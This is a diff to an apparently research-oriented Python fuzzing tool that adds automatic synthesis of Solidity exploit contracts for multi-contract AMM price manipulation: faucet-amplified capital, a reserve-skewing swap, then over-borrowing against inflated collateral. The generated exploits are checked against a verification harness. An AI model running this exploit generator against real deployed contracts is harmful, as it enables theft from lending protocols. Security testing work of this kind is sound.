@@ -1409,6 +1409,127 @@ def _synth_reentrancy(target_src):
     return out
 
 
+def _contract_bodies(src):
+    """{contractName: body} — 소스 안 각 컨트랙트의 본문을 브레이스 매칭으로 뽑는다."""
+    out = {}
+    for mm in re.finditer(r"\bcontract\s+(\w+)", src):
+        bi = src.find("{", mm.end())
+        if bi < 0:
+            continue
+        out[mm.group(1)] = _extract_block(src, bi)
+    return out
+
+
+def _synth_amm(target_src, name):
+    """다중 컨트랙트(대출데스크 + AMM 풀 + 토큰)가 얽힌 가격 조작을 이름에 의존하지
+    않고 합성한다. 타깃이 게터로 노출한 풀·토큰을 발견하고, faucet/mint 로 자본을
+    증폭(플래시론식)해 풀 준비금을 왜곡→과대평가된 담보로 초과 차입한다."""
+    src = _strip_comments(target_src)
+    bodies = _contract_bodies(src)
+    if name not in bodies:
+        return []
+    contracts = set(bodies)
+    # 토큰형 / 풀형 컨트랙트 식별
+    def is_token(b): return ("transferFrom" in b and "approve" in b and "balanceOf" in b)
+    def is_pool(b):
+        has_swap = bool(re.search(r"function\s+(swap\w*|trade|exchange)\s*\(", b))
+        has_price = bool(re.search(r"function\s+(spotPrice|getPrice|price\w*|quote)\s*\(", b))
+        return has_swap and (has_price or "reserve" in b.lower())
+    token_types = {c for c,b in bodies.items() if is_token(b)}
+    pool_types  = {c for c,b in bodies.items() if is_pool(b) and c not in token_types}
+    if not pool_types:
+        return []
+    tb = bodies[name]
+    # 타깃의 공개 상태 게터: `Type public [immutable] gname;`
+    getters = {}  # gname -> Type
+    for tm in re.finditer(r"\b(\w+)\s+public\s+(?:immutable\s+|constant\s+)?(\w+)\s*;", tb):
+        typ, g = tm.group(1), tm.group(2)
+        if typ in contracts:
+            getters[g] = typ
+    pool_getters  = [g for g,t in getters.items() if t in pool_types]
+    token_getters = [g for g,t in getters.items() if t in token_types]
+    if not pool_getters or len(token_getters) < 2:
+        return []
+    # 풀 함수들
+    pb = bodies[next(t for t in pool_types if t in getters.values() or True)]
+    pool_fns = _functions(pb)
+    swap_names = [f["name"] for f in pool_fns
+                  if re.match(r"(swap\w*|trade|exchange)$", f["name"] or "") and
+                  len(f["args"])>=1 and f["args"][0][0].startswith("uint")]
+    price_names = [f["name"] for f in pool_fns
+                   if re.match(r"(spotPrice|getPrice|price\w*|quote)$", f["name"] or "") and not f["args"]]
+    if not swap_names or not price_names:
+        return []
+    price = price_names[0]
+    # 타깃(데스크) 함수: faucet(무인자·자본지급) / deposit(uint·transferFrom) / borrow(uint·가격참조)
+    desk_fns = _functions(tb)
+    faucet = next((f["name"] for f in desk_fns
+                   if not f["args"] and (re.search(r"faucet|topup|drip|claim|gimme|mint", f["name"], re.I)
+                                         or "mint(msg.sender" in f["body"].replace(" ",""))), None)
+    deposit = next((f["name"] for f in desk_fns
+                    if len(f["args"])==1 and f["args"][0][0].startswith("uint") and "transferFrom" in f["body"]), None)
+    borrow = next((f["name"] for f in desk_fns
+                   if len(f["args"])==1 and f["args"][0][0].startswith("uint")
+                   and (any(pg in f["body"] for pg in pool_getters)
+                        or re.search(r"spotPrice|getPrice|price|quote", f["body"]))), None)
+    if not (faucet and deposit and borrow):
+        return []
+    # 담보/차입 게터 방향은 이름 힌트로 우선, 애매하면 두 순서 모두 변형 생성
+    def score_col(g): return sum(k in g.lower() for k in ("col","asset","pledge","stake","collat"))
+    def score_bor(g): return sum(k in g.lower() for k in ("bor","debt","loan","cash","stable","quote","usd"))
+    pairs = []
+    a,b = token_getters[0], token_getters[1]
+    if score_col(a)+score_bor(b) >= score_col(b)+score_bor(a):
+        pairs.append((a,b))  # (collateral, borrow)
+        pairs.append((b,a))
+    else:
+        pairs.append((b,a)); pairs.append((a,b))
+    out = []
+    for pg in pool_getters[:1]:
+        for sw in swap_names[:2]:
+            for (colg, borg) in pairs:
+                code = (HEADER +
+                    "// Strategy: multi-contract AMM price manipulation (flash-loan style).\n"
+                    "// Amass borrow-token capital via the faucet, skew the pool reserves with\n"
+                    "// a large swap to spike the collateral spot price, then over-borrow.\n"
+                    "interface IERC20 { function approve(address,uint256) external returns (bool);\n"
+                    "                   function balanceOf(address) external view returns (uint256); }\n"
+                    "interface IPool  { function " + sw + "(uint256) external;\n"
+                    "                   function " + price + "() external view returns (uint256); }\n"
+                    "interface IDesk  {\n"
+                    f"    function {pg}() external view returns (address);\n"
+                    f"    function {colg}() external view returns (address);\n"
+                    f"    function {borg}() external view returns (address);\n"
+                    f"    function {faucet}() external;\n"
+                    f"    function {deposit}(uint256) external;\n"
+                    f"    function {borrow}(uint256) external;\n"
+                    "}\n\n"
+                    "contract Exploit {\n"
+                    "    function run(address _t) external payable {\n"
+                    "        IDesk d = IDesk(_t);\n"
+                    f"        IERC20 col = IERC20(d.{colg}());\n"
+                    f"        IERC20 bor = IERC20(d.{borg}());\n"
+                    f"        address pool = d.{pg}();\n"
+                    f"        for (uint256 i=0;i<200;i++) {{ d.{faucet}(); }}\n"
+                    "        uint256 cash = bor.balanceOf(address(this));\n"
+                    "        bor.approve(pool, type(uint256).max);\n"
+                    f"        IPool(pool).{sw}(cash);\n"
+                    "        uint256 c = col.balanceOf(address(this));\n"
+                    "        require(c > 0, \"no collateral\");\n"
+                    "        col.approve(_t, type(uint256).max);\n"
+                    f"        d.{deposit}(c);\n"
+                    f"        uint256 px = IPool(pool).{price}();\n"
+                    "        uint256 value = (c * px) / 1e18;\n"
+                    "        uint256 liq = bor.balanceOf(_t);\n"
+                    "        uint256 amt = value < liq ? value : liq;\n"
+                    f"        if (amt > 0) d.{borrow}(amt);\n"
+                    "    }\n"
+                    "    receive() external payable {}\n"
+                    "}\n")
+                out.append((f"amm-manip:{faucet}→{sw}→{deposit}→{borrow}", code))
+    return out
+
+
 def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_step, t0):
     # 0) 재진입 합성: 소스에서 유도한 (예치→인출) 공격 컨트랙트를 하네스로 검증
     try:
@@ -1428,6 +1549,27 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
                         "balance_before_wei":meta.get("balance_before_wei"),
                         "balance_after_wei":meta.get("balance_after_wei"),
                         "note":"템플릿 미매치 → 퍼저가 재진입 공격을 합성해 성립시켰습니다.",
+                        "ms":int((time.time()-t0)*1000)}
+    except Exception:
+        pass
+    # 0b) 다중 컨트랙트 AMM 가격 조작(플래시론식) 합성
+    try:
+        for label, ex in _synth_amm(target_src, name):
+            try:
+                if do_verify and invariants_src:
+                    proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, ex, manifest)
+                else:
+                    proven, vsteps, meta = _run_effect(name, target_src, ex, manifest)
+            except Exception:
+                continue
+            if proven:
+                gen = {"step":"generate","title":"Exploit.sol 생성 (amm-manip)","strategy":label,"exploit_src":ex}
+                return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",""),
+                        "strategy":label,"steps":[scan_step,gen]+vsteps,"exploit_src":ex,
+                        "mode":("verify" if (do_verify and invariants_src) else "effect"),
+                        "balance_before_wei":meta.get("balance_before_wei"),
+                        "balance_after_wei":meta.get("balance_after_wei"),
+                        "note":"템플릿 미매치 → 다중 컨트랙트 AMM 조작(플래시론식)을 합성해 성립시켰습니다.",
                         "ms":int((time.time()-t0)*1000)}
     except Exception:
         pass
